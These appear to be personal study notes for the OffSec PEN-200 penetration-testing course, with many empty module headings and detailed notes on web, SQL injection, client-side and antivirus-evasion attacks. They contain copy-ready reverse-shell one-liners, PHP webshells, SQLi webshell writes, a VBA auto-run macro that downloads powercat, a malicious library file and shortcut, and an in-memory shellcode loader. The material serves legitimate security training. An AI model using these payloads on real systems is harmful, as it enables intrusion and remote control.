---
description: >-
  The certification associated with this course is the OffSec Certified
  Professional (OSCP+).
---

# PEN-200

{% hint style="success" %}
Hack Responsibly.

Always ensure you have explicit permission to access any computer system before using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

> These will be the notes I felt were worth writing down as things I was not completely familiar with and/or were new to me at the time of working through this course.
>
> Some sections _may_ be empty due to nothing being worth noting IMO.
>
> Modules 1-9.1 of this course were completed prior to my starting this note-taking. _Hopefully_ I go back to take notes.

## Module 1: Copyright

### Copyright

_Copyright information, nothing to note._

***

## Module 2: Penetration Testing with Kali Linux: General Course Information

### Getting Started with PWK

#### PWK Course Materials

#### Student Mentors and Support

#### Setting up Kali

#### Connecting to the PWK Lab

### How to Approach the Course

#### A Model of Increasing Uncertainty

#### Learning Modules

#### Demonstration Module Exercises

#### Applied Module Exercises

#### Capstone Module Labs

#### Assembling the Pieces

#### Challenge Labs 1-3

#### Challenge Labs 4-6

### Summary of PWK Learning Modules

#### Getting Started: Optional Ramp-up Modules

#### Enumeration and Information Gathering

#### Web Application and Client Side Attacks

#### Other Perimeter Attacks

#### Privilege Escalation and Lateral Movement

#### Active Directory

#### Challenge Lab Preparation

***

## Module 3: Introduction to Cybersecurity

### The Practice of Cybersecurity

#### Challenges in Cybersecurity

#### A Word on Mindsets

#### On Emulating the Minds of our Opponents

### Threats and Threat Actors

#### The Evolution of Attack and Defense

#### Risks, Threats, Vulnerabilities, and Exploits

#### Threat Actor Classifications

#### Recent Cybersecurity Breaches

### The CIA Triad

#### Confidentiality

#### Integrity

#### Availability

#### Balancing the Triad with Organizational Objectives

### Security Principles, Controls, and Strategies

#### Security Principles

#### Security Controls and Strategies

#### Security Models

#### Shift-Left Security

#### Administrative Segmentation

#### Threat Modelling and Threat Intelligence

#### Table-Top Tactics

#### Continuous Patching and Supply Chain Validation

#### Backups

#### Encryption

#### Logging and Chaos Testing

### Cybersecurity Laws, Regulations, Standards, and Frameworks

#### Laws and Regulations

#### Standards and Frameworks

#### Anatomy of Cyber

### Career Opportunities in Cybersecurity

#### Cybersecurity Career Opportunities: Attack

#### Cybersecurity Career Opportunities: Defend

#### Cybersecurity Career Opportunities: Build

#### Additional Roles

***

## Module 4: Effective Learning Strategies

### Learning Theory

#### What We Know and What We Don't

#### Memory Mechanisms and Dual Coding

#### The Forgetting Curve and Cognitive Load

### Unique Challenges to Learning Technical Skills

#### Digital vs. Print Materials

#### Expecting the Unexpected

#### The Challenges of Remote and Asynchronous Learning

### OffSec Training Methodology

#### The Demonstration Method

#### Learning by Doing

#### Facing Difficulty

#### Contextual Learning and Interleaving

### Case Study: chmod -x chmod

#### What is Executable Permission?

#### Going Deeper: Encountering a Strange Problem

#### One Potential Solution

#### Analyzing this Approach

### Tactics and Common Methods

#### Cornell Notes

#### Retrieval Practice

#### Spaced Practice

#### The SQ3R Method

#### The Feynman Technique

### Advice and Suggestions on Exams

#### Dealing with Stress

#### Knowing When You're Ready

#### Practical Advice for Exam Takers

### Practical Steps

#### Creating a Long Term Strategy

#### Use Time Allotment Strategies

#### Narrowing our Focus

#### Pick a Strategy

#### Find a Community of Co-Learners

#### Study Your Own Studies

***

## Module 5: Report Writing for Penetration Testers

### Understanding Note-Taking

#### Penetration Testing Deliverables

#### Note Portability

#### The General Structure of Penetration Testing Notes

#### Choosing the Right Note-Taking Tool

#### Taking Screenshots

#### Tools to Take Screenshots

### Writing Effective Technical Penetration Testing Reports

#### Purpose of a Technical Report

#### Tailor the Content

#### Executive Summary

#### Testing Environment Considerations

#### Technical Summary

#### Technical Findings and Recommendation

#### Appendices, Further Information, and References

***

## Module 6: Information Gathering

### The Penetration Testing Lifecycle

### Passive Information Gathering

#### Whois Enumeration

#### Google Hacking

#### Netcraft

#### Open-Source Code

#### Shodan

#### Security Headers and SSL/TLS

### Active Information Gathering

#### DNS Enumeration

#### TCP/UDP Port Scanning Theory

#### Port Scanning with Nmap

#### SMB Enumeration

#### SMTP Enumeration

#### SNMP Enumeration

***

## Module 7: Vulnerability Scanning

### Vulnerability Scanning Theory

#### How Vulnerability Scanners Work

#### Types of Vulnerability Scans

#### Things to consider in a Vulnerability Scan

### Vulnerability Scanning with Nessus

#### Installing Nessus

#### Nessus Components

#### Performing a Vulnerability Scan

#### Analyzing the Results

#### Performing an Authenticated Vulnerability Scan

#### Working with Nessus Plugins

### Vulnerability Scanning with Nmap

NSE Vulnerability Scripts

Working with NSE Scripts

***

## Module 8: Introduction to Web Application Attacks

### Web Application Assessment Methodology

### Web Application Assessment Tools

#### Fingerprinting Web Servers with Nmap

#### Technology Stack Identification with Wappalyzer

#### Directory Brute Force with Gobuster

#### Security Testing with Burp Suite

### Web Application Enumeration

#### Debugging Page Content

#### Inspecting HTTP Response Headers and Sitemaps

#### Enumerating and Abusing APIs

### Cross-Site Scripting

#### Stored vs Reflected XSS Theory

#### JavaScript Refresher

#### Identifying XSS Vulnerabilities

#### Basic XSS

#### Privilege Escalation via XSS

***

## Module 9: Common Web Application Attacks

### Directory Traversal

#### Absolute vs Relative Paths

#### Identifying and Exploiting Directory Traversals

#### Encoding Special Characters

### File Inclusion Vulnerabilities

#### Local File Inclusion (LFI)

The difference here is that including a local file will execute it rather than read the contents of it. Using Log Poisoning with php and LFI, we can execute commands on the web server.

Taking a look at the previous directory traversal vulnerability, let's see what information is stored in the `/var/log/apache2/access.log`. In the example provided, the User-Agent is stored. Using this information we can pass along a crafted User-Agent to execute commands via a cmd parameter. Sending to the `index.php?page=admin.php` a crafted user-agent of `User-Agent: <?php echo system($_GET['cmd']); ?>` Utilizing this string, we can then navigated to the access.log, appending `&cmd=<our command here>` to execute via LFI.

After testing that the cmd parameter works, let's get a reverse shell. We'll need to URL encode the data so it's treated correctly. A simple reverse shell one-liner in bash: `bash -c "bash -i >& /dev/tcp/my.listener.ip.here/port 0>&1"` would be URL encoded as `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.236%2F1337%200%3E%261%22` Another example might be `bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.236/1337+0>%261'%22`

#### PHP Wrappers

Include the contents of a file:

* php://filter

Using the PHP filter wrapper in a similar way as previous sections: `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php` This results in a similar content as requesting admin.php earlier. Using teh PHP filter to encode the content in base64, we can get the content of admin.php. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`

Achieve code execution:

* data:// Using the PHP data wrapper to execute commands: `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`

Some WAFs may filter strings such as system, so we'll base64 the command.

```bash
$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

#### Remote File Inclusion (RFI)

Kali includes several webshells are `/usr/share/webshells/` that can be used for RFI.

For RFI, you'll need your remote files to be available somewhere. This can easily be done with `python3 -m http.server 80` which will start a listener on port 80 on all your local interfaces. This hosts any files in your current working directory. Example: `curl http://mountaindesserts.com/meteor/index.php?page=http://your.listener.ip.here/simple-backdoor.php&cmd=cat+/etc/passwd`

### File Upload Vulnerabilities

#### Using Executable Files

Identifying file upload vulnerabilities:

* Can we upload a file in general?
* Is there file extension limitations? Are they case sensitive? Can we use "legacy" extensions? ex. .phps, .php7

#### Using Non-Executable Files

When using non-executable files, we _may_ be able to overwrite important files like `.ssh/authorized_keys` for example. Example in Burp Suite's Repeater:

```http
POST /upload HTTP/1.1
Host: 192.168.241.16:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------39100938162538926675637912586
Content-Length: 386
Origin: http://192.168.241.16:8000
Connection: keep-alive
Referer: http://192.168.241.16:8000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------39100938162538926675637912586
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7b2Apfpf+ynNDsc702r7dotHjS9RH9gF6AvRP9w5SD user@hostname.local

-----------------------------39100938162538926675637912586--

```

### Command Injection

#### OS Command Injection

While communicating with a Windows device vulnerable to command injection, you can use ``(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`` to determine if you're running commands inside a CMD or PowerShell prompt. This would likely need to be URL encoded. If inside PowerShell, PowerCat can be used to create a reverse shell. PowerCat is a PowerShell implementation of Netcat included in Kali at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`.

* Example usage of powercat.ps1 via command injection: `IEX (New-Object System.Net.Webclient).DownloadString("http://your.listener.ip.here:port/powercat.ps1");powercat -c your.listener.ip.here -p port -e powershell`
  * Curling that with URL encoding may look like this: `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2Fyour.listener.ip.here%3Aport%2Fpowercat.ps1%22)%3Bpowercat%20-c%20your.listener.ip.here%20-p%20port%20-e%20powershell' http://your.target.ip.here:port/archive`

***

## Module 10: SQL Injection Attacks

### SQL Theory and Databases

#### SQL Theory Refresher

Structured Query Language (SQL) was developed to manage and interact with data stored inside _relational databases_. It can query, insert, modify, delete data, and in some cases execute operating system commands.

SQL syntax, commands, and functions vary based on which relational database they're made for. _MySQL, Microsoft SQL Server_, and _Oracle_ are the most popular database implementations.

{% hint style="warning" %}
{% code overflow="wrap" %}
```
The "i" inside the _mysqli_query_ stands for improved and should and if I was really not confused with the "i" in the SQLi vulnerability which stands for injection.
```
{% endcode %}
{% endhint %}

#### DB Types and Characteristics

> **MySQL**

Connecting to the remote SQL instance, specifying **root** as the username and password, along with the default MySQL server port **3306**.

Example: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`

Note: If you're running into issues with self-signed certs, add the `--ssl=0` option. The error I received when working through the material was `ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain`

While inside the MySQL console shell, we can run various functions to retrieve additional information.

* Retrieving the version of the SQL instance: `select version();` or `select @@version;`
* Verifying the current database user for the ongoing session: `select system_user();`
* List databases: `show databases;`
* List tables in the mysql database: `show tables from mysql;`
* Selecting everything from the _user_ table in the _mysql_ database: `SELECT * FORM mysql.user;`

To improve security, user passwords are stored in the _authentication\_string_ field as a _Caching-SHA-256 algorithm_.

> **MSSQL** MSSQL is a database managemetn system that natively integrates into the Windows ecosystem.

Windows has a build-in CLI tool named _SQLCMD_, which allows SQL queries to be run through the Windows command prompt or remotely from another machine. Kali includes _Impacket_, a Python framework which enables network protocol interactions. It supports _Tabular Data Stream (TDS)_, the protocol adopted by MSSQL that is implemented in the _impacket-mssqlclient_ tool.

We can run `impacket-mssqlclient` to connect to the remote Windows machine running MSSQL. Using `-windows-auth` forces NTLM authentication rather than Kerberos. Example: `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`

Once inside the MSSQL console shell, we can run various functions similar to the previously noted MySQL commands.

{% hint style="warning" %}
{% code overflow="wrap" fullWidth="false" %}
```
When using a SQL Server CLI tool like sqlcmd, we must submit the SQL statement with a semicolon followed by GO on a separate line. However, running remote commands allows us to omit the GO statement as it's not part of the MSSQL TDS protocol.
```
{% endcode %}
{% endhint %}

* Verifying the version: `SELECT @@version;`
* List databases: `SELECT name FROM sys.databases;`\
  _master, tempdb, model_, and _msdb_ are default databases.
* Querying tables in the _offsec_ database: `SELECT * FROM offsec.information_schema.tables;`
* Selecting all records from the _users_ table under the table\_schema _dbo_ in the _offsec_ database: `SELECT * FROM offsec.dbo.users;`

### Manual SQL Exploitation

#### Identifying SQLi via Error-based Payloads

In manual testing, we can try closing a quote and adding an `OR 1-1` statement followed by a `--` comment separate and two forward slashes (`//`) to prematurely terminate teh SQL statement. This syntax requires two consecutive dashes followed by at least **one** whitespace character. The example utilizes two slashes to provide visibility on the payload and add some protection against any kind of whitespace truncation employed. Example: `offsec' OR 1=1 -- //` The SQL query in this example will then result in the following backend SQL statement: `SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --`

A quick and simple test for SQLi is to submit a single quote `'` to see how the web application behaves. Note: _Most_ production-level web applications won't show errors because revealing SQL debugging information is considered a security flaw.

If we know a SQLi is available, we can inject an arbitrary second statement as well. Example: `' or 1=1 in (select @@version) -- //'`

#### UNION-based Payloads

Whenever dealing with in-band SQLi where the result of the query is displayed along with the applciation-returend value, we should also test for _UNION-based_ SQL injections.

The **UNION** statements assists exploitation because it enables the execution of another SELECT statement, providing the results in the same query.

For a **UNION** SQLi to work, it has two requirements:

1. The injection **UNION** query has to include the same number of columns as the original query.
2. The data types must be compatible between each column.

To determine how many columns, we can submit the command `' ORDER BY 1-- //'`, incrementing the order until we receive an error which lets us know that numbered column does not exist. As an example, if the table has 5 columns, we can execute: `%' UNION SELECT database(), user(), @@version, null, null -- //` This resulted, in the material with displaying the result of user and version, but not database. Likely because the first column is typically reserved for the ID field consisting of _integer_ data type values, meaning a string cannot be returned for database(). With this in mind, let's re-order the request, ensuring the queries we know will return string, are "lined up" with the original select statement's columns. Example: `'UNION SELECT null, null, database(), user(), @@version -- //`

To expand on this, let's grab the columns table from the _information\_schema_ database belonging to the current database, storing the output in the second, third, and fourth columns. Example: `' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`

#### Blind SQL Injections

A _blind_ SQLi describes scenarios where database responses are never returned and behavior is inferred using boolean- or time-based logic. Example time-based SQLi: `http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- //` In the above case, if the user _offsec_ does exist then the browser will hang for about three seconds, if not then it will immediately return.

### Manual and Automated Code Execution

#### Manual Code Execution

In Microsoft SQL Server, the _xp\_cmdshell_ function takes a string and passes it to a command shell for execution. This function is disabled by default, and once enabled, must be called with the **EXECUTE** keyword rather than SELECT. To enable it, execute the following commands in a MSSQL shell:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

It can now be used like so: `EXECUTE xp_cmdshell 'whoami';`

Using a UNION-based payload, we can write a webshell into a file on disk. Example: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //` Running into the error regarding the value type not matching (column 1 being an integer for example) isn't an issue that affect writing to disk. The above code _should_ still write the webshell to the location written.

#### Automating the Attack

There are several tools to automate SQLi. One very popular tool is **sqlmap**. Example usage of sqlmap: `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`

| Switch     | Explanation                      |
| ---------- | -------------------------------- |
| -u         | specify the URL to scan          |
| -p         | specify the parameter to test    |
| --dump     | dump the entire database         |
| --os-shell | provide a full interactive shell |

Because Blind SQLi can take so long, it can be useful to download the post/get request from burpsuite then providing it to sqlmap to automate this rather then doing it yourself.

***

## Module 11: Client-side Attacks

### Target Reconnaissance

#### Information Gathering

One approach to information gathering without interacting with a target is to inspect the _metadata_ tags of publicly-available documents associate with the target organization. It _can_ be santizied, but often isn't. Documents found may be outdated as well. To do this, we can use the `exiftool` tool. Example: `exiftool -a -u file.pdf`

| Switch | Explanation             |
| ------ | ----------------------- |
| -a     | display duplicated tags |
| -u     | display unknown tags    |

We can also utilize google dorking with a search like `site:example.com filetype:pdf`.

If we are fine interacting with the target's website, we can use gobuster with the `-x` parameter to search for specific file extensions. Be aware, this is **noisy** and _will_ generate log entries on the target.

#### Client Fingerprinting

Client Fingerprinting, also known as _Device Fingerprinting_ involves obtaining operating system and brownser information to determine what that device is.

[Canarytokens](https://canarytokens.org/nest) is a free web service that generates a link with an embedded token. This will gather information about the browser, IP address, and operating system when clicked.

There are some additional options like the online IP logger Grabify or JavaScript fingerprinting libraries such as fingerprint.js.

### Exploiting Microsoft Office

#### Preparing the Attack

With Office macro attacks being so common, email providers and spam filter solutions often filter out all Microsoft Office documents by default. Additionally, most anti-phishing training programs stress the danger of enabling macros in an email Office document.

To provide an increase chance of the target opening our malicious document, pretext and other ways to access teh file are crucial. Examples being download links, Sharepoint/OneDrive share links, etc.

These files, if successfully sent to the targe twill be tagged with the _Mark of the Web_ (MOTW). Documents tagged with MOTW will open in _Protected View_, disabling all editing and modiification settings in the document and blocks macro execution or embedded objects. The user will also be presented with the SECURITY WARNING banner, with the option to Enable Content.

#### Installing Microsoft Office

Nothing to add, it's installing Microsoft Office...

#### Leveraging Microsoft Word Macros

Creating macros in Word: View > Macros. Make sure the file is saved as a .doc or .docm so the macros are persistent.

A new macro consists of an empty sub procedure containing several lines beginning with an apostrophe, which marks the start of a single-line comment in VBA.

```vba
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

We'll be leveraging _ActiveX Objects_, which provide access to underlying operating system commands. This can be achieve with _WScript_ through the _Windows Script Host Shell object_. After instantiating a Windows Script Host Shell object with _CreateObject_, we can invoke the _Run_ method for _Wscript.Shell_ to launch an application. In this example, we'll start a PowerShell window.

```vba
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

Office macros are not executed automatically, so we must use teh predefined _AutoOpen_ macro and _Document\_Open_ event.

```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

Note: VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string in the example of a powercat reverse shell. This restriction **does not** apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.

```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str as String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Now let's generate the base64'd powercat reverse listener: `echo -ne "IEX(New-Object System.Net.WebClient).DownloadString('http://your.listener.ip.here:port/powercat.ps1');powercat -c your.listener.ip.here -p port -e powershell" | base64` Run a simple python script to break it up into the multiple variables for the VBA script:

```python
str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk..."

n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Having now split the base64-encoded string into smaller chunks, we can update our macro:

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str as String
    Str = Str + "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY"
        Str = Str + "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5"
        Str = Str + "nKCdodHRwOi8veW91ci5saXN0ZW5lci5pcC5oZXJlOnBvcnQvc"
        Str = Str + "G93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgeW91ci5saXN0ZW5"
        Str = Str + "lci5pcC5oZXJlIC1wIHBvcnQgLWUgcG93ZXJzaGVsbA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

After that, start up a python3 web server in the directory hosting the powercat script and a netcast listener on the port you chose. Double clicking the document and enabling content will download powercat and execute the reverse listener. If you run into any issues with that like I did, take a look at using this python script from glowbase. [https://github.com/glowbase/macro\_reverse\_shell](https://github.com/glowbase/macro\_reverse\_shell). Additionally, if this will be running on a Windows device, ensure the command is UTF16LE (1200) encoded.

### Abusing Windows Library Files

#### Obtaining Code Execution via Windows Library Files

For this section, we'll be utilizing a _WebDAV_ share to host the payload in the form of a **.lnk** shortcut file for executing a PowerShell reverse shell. The reason we'll be using the WebDAV share and the **.Library-ms** library file is because a majority of spam filters and security technologies will pass Windows library files directly to the user. After opening it, the user will be taken to our malicious .lnk file.

First, we'll install WsgiDAV with **pip3**. `pip3 install wsgidav` If the installation of WsgiDAV fails with **error: externally-managed-environment**, we can use a virtual environment or install the package _python3-wsgidav_ with apt.

Next we'll run WsgiDAV from the **/home/kali/.local/bin** directory.

```bash
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

| Switch | Explanation                                    |
| ------ | ---------------------------------------------- |
| --host | Specifies the host to server from              |
| --port | The port to listen on                          |
| --auth | disable authentication when set to anonymous   |
| --root | Setting the root directory of the WebDAV share |

Library files consist of three major parts and are written in XML to specify parameters for accessing remote locations.

1. _General library information_
2. _Library properties_
3. _Library Description Schema_

Start by creating a new file named **config.Library-ms**. Important Tags and their use will be covered in each code sample section: The namespace for the library file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```

The _name_ tag: Specifies the name of the library. Examples: _@shell32.dll,-34575_ or _@windows.storage.dll,-34582_. The _version_ tag: Any numerical value.

```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

The _isLibraryPinned_ tag: specifies if the library is pinned to the navigation pane in Windows Explorer. This may make it appear more genuine if set to **true**. The _iconReference_: determines what icon is used.

```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```

The _templateInfo_ and _folderType_ tags: These determine columns and details that appear in Windows Explorer. A GUID must be specified. The example will use the **Documents** GUID.

```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```

The _searchConnectorDescriptionList_ tag: Contains a list of _search connectors_ defined by _searchConnectorDescription_. These are used by library files to specify the connection settings. The _isDefaultSaveLocation_ tag: Determines the behavior of Windows Explorer when a user chooses to save an item. Default behavior is a value of **true**. The _isSupported_ tag: Used for compatability -- not documented in the Microsoft Documentation webpage. The _url_ tag: Points to the remote location. The _simpleLocation_ tags: contain the _url_ tag. Can specify the remote location in a more user-friendly way as the normal _locationProvider_ element.

```xml
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://your.listener.ip.here:port</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```

Final code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://your.listener.ip.here:port</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Creating the malicious .lnk:

1. Create Shortcut
2. Set the location to `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://your.listener.ip.here:port/powercat.ps1'); powercat -c your.listener.ip.here -p port -e powershell"`
3. Name it `totally_safe`.
4. Click Finish

***

## Module 12: Locating Public Exploits

### Getting Started

#### A Word of Caution

{% hint style="warning" %}
Read code before executing it if you didn't write it. Don't be stupid.
{% endhint %}

### Online Exploit Resources

#### The Exploit Database

{% embed url="https://www.exploit-db.com/" %}

Useful columns on the Exploit-DB outside the obvious.&#x20;

1. D: Download the exploit.
2. A: Download the application files for investigation/review.
3. V: Specifies if the exploit is verified.

#### Packet Storm

{% embed url="https://packetstormsecurity.com/" %}

#### GitHub

{% embed url="https://github.com/" %}

#### Google Search Operators

Google Dorking, pretty straight-forward.

### Offline Exploit Resources

#### Exploit Frameworks

Some exploit frameworks:

* Metasploit
* Core Impact
* Canvas
* Browser Exploitation Framework (BeEF)

#### SearchSploit

Local copy of the exploit database is stored in `/usr/share/exploitdb/`. This directory is split into **exploits** and **shellcodes**. It contains CSV files for each of the directories with information on all files in the two subdirectories.

Copy an exploit to your current directory: `searchsploit -m path/to/exploit.py` or `searchsploit -m edb-id`

#### Nmap NSE Scripts

Nmap's Scripting Engine directory can be found at `/usr/share/nmap/scripts/`. Information on the scripts can be found by running `nmap --script-help=script-name.nse`.

### Exploiting a Target

#### Putting It Together

Nothin' specific to this section, note-wise. This was a walkthrough of using what was covered in the module to exploit a target.

Automatic URL encoding for those pesky web RCEs:\
`curl http://target/path/to/backdoor.php --data-urlencode "cmd=which nc"`

***

## Module 13: Fixing Exploits

### Fixing Memory Corruption Exploits

#### Buffer Overflow in a Nutshell

_General flow of a standard stack-based buffer overflow:_

1. Create a large buffer to trigger the overflow.
2. Take control of EIP by overwriting a return address on the stack, padding the large buffer with an appropriate offset.
3. Include a chosen payload in the buffer prepended by an optional NOP5 sled.
4. Choose a correct return address instruction such as JMP ESP (or a different register) to redirect the execution flow to the payload.

#### Importing and Examining the Exploit

_Be aware of the difference between compiled code and code run through an interpreter._

#### Cross-Compiling Exploit Code

In most scenarios, it is best to use native compilers for the specific OS targeted, though this may not always be an option. In this case, use a cross-compiler like **mingw-w64**.\
Installation: `sudo apt install mingw-w64`

Test out the compilation to determine if errors occur.\
Example: `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`\
In this specific case, an error referencing `_imp__WSAStartup@8` bein googled, tells us that it is a function in **winsock.h** which couldn't be found. The resolution being that we can include the **-lws2\_32** parameter to our previous command.\
Revised example: `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`&#x20;

#### Fixing the Exploit

_No comment._

#### Changing the Overflow Buffer

_No comment._

### Fixing Web Exploits

#### Considerations and Overview

_Key questions:_

* Does it initiate an HTTP or HTTPS connection?
* Does it access a specific web application path or route?
* Does the exploit leverage a pre-authentication vulnerability?
* If not, how does the exploit authenticate to the web application?
* How are the GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
* Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
* Will oddities such as self-signed certificates disrupt the exploit?

#### Selecting the Vulnerability and Fixing the Code

Pretty straightforward, look at the code and update as needed.

#### Troubleshooting the "index out of range" Error

_...print out the variable causing issues to troubleshoot..._

***

## Module 14: Antivirus Evasion

### Antivirus Software Key Components and Operations

#### Known vs Unknown Threats

#### AV Engines and Components

#### Detection Methods

* Signature-based Detection
  * Considered a _restricted list technology_. Can be a hash, specific values, strings, etc.
* Heuristic-based Detection
  * Various rules and algorithms determine whether an action is considered malicious. Often by stepping through the instruction set of the binary.
* Behavioral Detection
  * Analyzing the behavior, often by executing the file in an emulated environment, searching for behaviors/actions that are considered malicious.
* Machine Learning Detection
  * Introducing ML algorithms to detect unknown threats by collecting and analyzing additional metadata.

### Bypassing Antivirus Detections

#### On-Disk Evasion

Highly effecting AV evasion requires a combination of packers, obfuscators, crypters, anti-reversing, anti-debuffing, virtual machine emulation detection, and so on. Software protectors were designed for legit purposes, like _anti-copy_ but can also be used for AV evasion.

#### In-Memory Evasion

_In-Memory Injections_ also known as _PE Injections_ are great for bypassing AV. It doesn't write to disk. \
_Remote Process Memory Injection_ - injecting a payload into a valid, non-malicious PE. This can be done via _Windows APIs:_

1. _OpenProcess_ to obtain a handle.
2. _VirtualAllocEx_ to allocate memory in the context of that process.
3. _WriteProcessMemory_ to copy the malicious payload to newly allocated memory.
4. _CreateRemoteThread_ to execute it.

### AV Evasion in Practice

#### Testing for AV Evasion

VirusTotal: Submitting samples to see how AV detects it. This provides the sample to the partners though.\
AntiScan.me: Supposedly does not share samples; tests with 30 AVs and has four free scans per day.

#### Evading AV with Thread Injection

A basic templated script that performs in-memory injection is shown below, shellcode could be generated via `msfvenom -p windows/shell_reverse_tcp LHOST=your.listener.ip.here LPORT=port -f powershell -v sc`:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

#### Automating the Process

_**Shellter**_ is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing AV. Ensure architecture **i386** is added and that **wine32** is installed. Then you can run `shellter`.\
Shellter can run in either _Auto_ or _Manual_ mode.

Manual: The tool will launch the PE we want to use for injection and allow us to manipulate it on a more granular level.\
Auto: The tool will automatically attempt to fully inject the malicious code into the PE.\
Stealth: attempt to restore the execution flow of the PE after our payload has been executed.

Kicking off a meterpreter listener in one line: `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST your.listener.ip.here;set LPORT port;run;"`

***
